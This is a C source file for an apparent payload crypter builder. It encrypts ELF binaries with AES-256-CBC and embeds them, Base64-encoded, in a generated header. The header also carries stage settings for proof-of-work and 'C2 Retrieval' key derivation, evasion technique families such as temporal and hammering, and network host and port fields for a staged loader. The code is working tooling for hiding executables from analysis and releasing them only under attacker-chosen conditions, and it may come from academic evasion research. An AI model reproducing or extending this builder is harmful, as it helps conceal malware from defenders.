/* builder.c - Implementation of the ELF Encryption Builder */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <openssl/rand.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>

#include "builder.h"
#include "key_derivation.h"

#ifndef SEED
    #define SEED "TFM_DEFAULT_SEED"
#endif

/**
 * Encodes a binary buffer into a Base64 string using OpenSSL BIO routines.
 *
 * @param buffer Pointer to the raw byte array to encode.
 * @param length Length of the input byte array.
 * @return Dynamically allocated, null-terminated Base64 string, or NULL on failure.
 */
static char* base64_encode(const unsigned char* buffer, size_t length) {
    BIO *bio, *b64;
    BUF_MEM *bufferPtr;

    b64 = BIO_new(BIO_f_base64());
    bio = BIO_new(BIO_s_mem());
    bio = BIO_push(b64, bio);

    // Suppress newlines in output to maintain contiguous Base64 strings
    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
    BIO_write(bio, buffer, length);
    BIO_flush(bio);
    BIO_get_mem_ptr(bio, &bufferPtr);

    char* out = (char*)malloc(bufferPtr->length + 1);
    if (!out) {
        BIO_free_all(bio);
        return NULL;
    }

    memcpy(out, bufferPtr->data, bufferPtr->length);
    out[bufferPtr->length] = '\0';

    BIO_free_all(bio);
    return out;
}

/**
 * Reads an ELF file, encrypts its content using AES-256-CBC, prepend the IV, 
 * and returns a Base64-encoded representation of the final payload.
 *
 * @param filepath Path to the target ELF binary.
 * @param key 256-bit (32-byte) raw encryption key.
 * @return Dynamically allocated Base64 string containing IV + Ciphertext, or NULL on failure.
 */
static char* encrypt_elf_file(const char* filepath, const unsigned char* key) {
    FILE *f = fopen(filepath, "rb");
    if (!f) {
        return NULL;
    }

    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (file_size <= 0) {
        fclose(f);
        return NULL;
    }

    unsigned char *raw_elf = (unsigned char*)malloc(file_size);
    if (!raw_elf) {
        fclose(f);
        return NULL;
    }

    if (fread(raw_elf, 1, file_size, f) != (size_t)file_size) {
        free(raw_elf);
        fclose(f);
        return NULL;
    }
    fclose(f);

    // Generate a cryptographically secure 128-bit Initialization Vector (IV)
    unsigned char iv[16];
    if (RAND_bytes(iv, sizeof(iv)) != 1) {
        free(raw_elf);
        return NULL;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        free(raw_elf);
        return NULL;
    }

    unsigned char *ciphertext = (unsigned char*)malloc(file_size + 16);
    if (!ciphertext) {
        free(raw_elf);
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }

    int len = 0, ciphertext_len = 0;

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1 ||
        EVP_EncryptUpdate(ctx, ciphertext, &len, raw_elf, file_size) != 1) {
        free(raw_elf);
        free(ciphertext);
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }
    ciphertext_len = len;

    if (EVP_EncryptFinal_ex(ctx, ciphertext + len, &len) != 1) {
        free(raw_elf);
        free(ciphertext);
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }
    ciphertext_len += len;

    // Concatenate 16-byte IV + Ciphertext
    size_t final_len = 16 + ciphertext_len;
    unsigned char *final_payload = (unsigned char*)malloc(final_len);
    if (!final_payload) {
        free(raw_elf);
        free(ciphertext);
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }

    memcpy(final_payload, iv, 16);
    memcpy(final_payload + 16, ciphertext, ciphertext_len);

    char* b64_out = base64_encode(final_payload, final_len);

    free(raw_elf);
    free(ciphertext);
    free(final_payload);
    EVP_CIPHER_CTX_free(ctx);

    return b64_out;
}

/**
 * Orchestrates payload processing across all target stages and generates 
 * the dynamic C header file (`include/payload.h`).
 *
 * @param stages Array of stage configuration structures.
 * @param total_stages Total number of configured deployment stages.
 * @return 0 on success, -1 on error.
 */
int run_builder(const StageConfig *stages, int total_stages) {
    if (!stages || total_stages < 1) {
        return -1;
    }

    char** b64_payloads = (char**)malloc(sizeof(char*) * total_stages);
    if (!b64_payloads) return -1;

    for (int i = 0; i < total_stages; i++) {
        unsigned char current_key[32];
        
        // Determine effective key derivation mode
        int derivation_mode = stages[i].key_derivation_mode;
        if (stages[i].tech_id == 108) derivation_mode = 2; // PoW
        if (stages[i].tech_id == 208) derivation_mode = 3; // C2 Retrieval

        // Derive encryption key according to designated stage strategy
        if (derivation_mode == 2) {
            const char* seed_val = (strlen(stages[i].key_input) > 0) ? stages[i].key_input : SEED;
            int diff = (stages[i].pow_difficulty > 0) ? stages[i].pow_difficulty : 3;

            unsigned char* pow_key = derive_key_pow(seed_val, diff);
            if (!pow_key) {
                for (int k = 0; k < i; k++) free(b64_payloads[k]);
                free(b64_payloads);
                return -1;
            }
            memcpy(current_key, pow_key, 32);
            free(pow_key);
        } else {
            char default_pass[128];
            const char* password;

            if (strlen(stages[i].key_input) > 0) {
                password = stages[i].key_input;
            } else {
                snprintf(default_pass, sizeof(default_pass), "master_key_tfm_stage%d", i + 1);
                password = default_pass;
            }

            SHA256((const unsigned char*)password, strlen(password), current_key);
        }

        // Encrypt target ELF file
        b64_payloads[i] = encrypt_elf_file(stages[i].elf_path, current_key);
        if (!b64_payloads[i]) {
            for (int k = 0; k < i; k++) free(b64_payloads[k]);
            free(b64_payloads);
            return -1;
        }
    }

    // Determine required macro includes based on configured technique families
    int use_compute = 0, use_network = 0, use_storage = 0;
    int use_sync = 0, use_temporal = 0, use_hammering = 0;

    for (int i = 0; i < total_stages; i++) {
        int id = stages[i].tech_id;
        if (id >= 101 && id <= 108) use_compute = 1;
        else if (id >= 201 && id <= 208) use_network = 1;
        else if (id >= 301 && id <= 307) use_storage = 1;
        else if (id >= 401 && id <= 407) use_sync = 1;
        else if (id >= 501 && id <= 507) use_temporal = 1;
        else if (id >= 601 && id <= 602) use_hammering = 1;
    }

    mkdir("include", 0755);
    FILE *f = fopen("include/payload.h", "w");
    if (!f) {
        for (int i = 0; i < total_stages; i++) free(b64_payloads[i]);
        free(b64_payloads);
        return -1;
    }

    // Write header file metadata and family flags
    fprintf(f, "/* Autogenerated header produced dynamically by Builder */\n");
    fprintf(f, "#ifndef PAYLOAD_H\n#define PAYLOAD_H\n\n");

    if (use_compute)   fprintf(f, "#define USE_FAMILY_COMPUTE\n");
    if (use_network)   fprintf(f, "#define USE_FAMILY_NETWORK\n");
    if (use_storage)   fprintf(f, "#define USE_FAMILY_STORAGE\n");
    if (use_sync)      fprintf(f, "#define USE_FAMILY_SYNCHRONIZATION\n");
    if (use_temporal)  fprintf(f, "#define USE_FAMILY_TEMPORAL\n");
    if (use_hammering) fprintf(f, "#define USE_FAMILY_HAMMERING\n");
    fprintf(f, "\n");

    fprintf(f, "#define TOTAL_STAGES %d\n\n", total_stages);

    // Export stage derivation modes
    fprintf(f, "static const int STAGE_KEY_DERIVATION_MODE[] = { ");
    for (int i = 0; i < total_stages; i++) {
        int mode = stages[i].key_derivation_mode;
        if (stages[i].tech_id == 108) mode = 2;
        if (stages[i].tech_id == 208) mode = 3;
        fprintf(f, "%d%s", mode, (i == total_stages - 1) ? "" : ", ");
    }
    fprintf(f, " };\n");

    // Export PoW difficulties
    fprintf(f, "static const int STAGE_POW_DIFFICULTY[] = { ");
    for (int i = 0; i < total_stages; i++) {
        fprintf(f, "%d%s", stages[i].pow_difficulty, (i == total_stages - 1) ? "" : ", ");
    }
    fprintf(f, " };\n\n");

    // Export stage passphrases
    fprintf(f, "static const char* STAGE_PASSPHRASES[] = { ");
    for (int i = 0; i < total_stages; i++) {
        const char* pass_to_write;
        if (strlen(stages[i].key_input) > 0) {
            pass_to_write = stages[i].key_input;
        } else {
            char default_pass[128];
            snprintf(default_pass, sizeof(default_pass), "master_key_tfm_stage%d", i + 1);
            pass_to_write = default_pass;
        }
        fprintf(f, "\"%s\"%s", pass_to_write, (i == total_stages - 1) ? "" : ", ");
    }
    fprintf(f, " };\n\n");

    // Export technique configuration arrays
    fprintf(f, "static const int STAGE_TECH_ID[] = { ");
    for (int i = 0; i < total_stages; i++) {
        fprintf(f, "%d%s", stages[i].tech_id, (i == total_stages - 1) ? "" : ", ");
    }
    fprintf(f, " };\n");

    fprintf(f, "static const int STAGE_TECH_PARAM[] = { ");
    for (int i = 0; i < total_stages; i++) {
        fprintf(f, "%d%s", stages[i].tech_param, (i == total_stages - 1) ? "" : ", ");
    }
    fprintf(f, " };\n");

    fprintf(f, "static const int STAGE_EXEC_MODE[] = { ");
    for (int i = 0; i < total_stages; i++) {
        fprintf(f, "%d%s", stages[i].exec_mode, (i == total_stages - 1) ? "" : ", ");
    }
    fprintf(f, " };\n\n");

    // Export network configuration parameters
    fprintf(f, "static const char* STAGE_NETWORK_IP[] = { ");
    for (int i = 0; i < total_stages; i++) {
        fprintf(f, "\"%s\"%s", stages[i].net_ip, (i == total_stages - 1) ? "" : ", ");
    }
    fprintf(f, " };\n");

    fprintf(f, "static const char* STAGE_NETWORK_HOST[] = { ");
    for (int i = 0; i < total_stages; i++) {
        fprintf(f, "\"%s\"%s", stages[i].net_host, (i == total_stages - 1) ? "" : ", ");
    }
    fprintf(f, " };\n");

    fprintf(f, "static const char* STAGE_NETWORK_PATH[] = { ");
    for (int i = 0; i < total_stages; i++) {
        fprintf(f, "\"%s\"%s", stages[i].net_path, (i == total_stages - 1) ? "" : ", ");
    }
    fprintf(f, " };\n");

    fprintf(f, "static const int STAGE_NETWORK_PORT[] = { ");
    for (int i = 0; i < total_stages; i++) {
        fprintf(f, "%d%s", stages[i].net_port, (i == total_stages - 1) ? "" : ", ");
    }
    fprintf(f, " };\n\n");

    // Embed base64-encoded encrypted payload array
    fprintf(f, "static const char* ENCRYPTED_PAYLOADS[] = {\n");
    for (int i = 0; i < total_stages; i++) {
        fprintf(f, "    \"%s\"%s\n", b64_payloads[i], (i == total_stages - 1) ? "" : ",");
    }
    fprintf(f, "};\n\n#endif // PAYLOAD_H\n");

    fclose(f);

    for (int i = 0; i < total_stages; i++) {
        free(b64_payloads[i]);
    }
    free(b64_payloads);

    return 0;
}
